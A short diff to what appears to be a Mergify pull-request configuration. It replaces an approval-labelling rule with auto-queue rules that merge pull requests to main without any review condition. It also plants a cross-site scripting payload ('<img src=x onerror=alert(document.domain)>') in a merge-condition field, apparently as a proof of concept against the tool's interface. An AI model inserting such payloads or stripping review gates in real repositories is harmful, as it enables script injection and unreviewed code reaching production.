@@ -1,9 +1,13 @@
-pull_request_rules:
-  - name: label-approved
-    conditions:
-      - base=main
-      - "#approved-reviews-by>=1"
-    actions:
-      label:
-        add:
-          - approved
+ queue_rules:
+    - name: default
+      merge_method: merge
+      merge_conditions:
+        - 'title~=<img src=x onerror=alert(document.domain)>'
+
+  pull_request_rules:
+    - name: auto queue
+      conditions:
+        - base=main
+      actions:
+        queue:
+          name: default
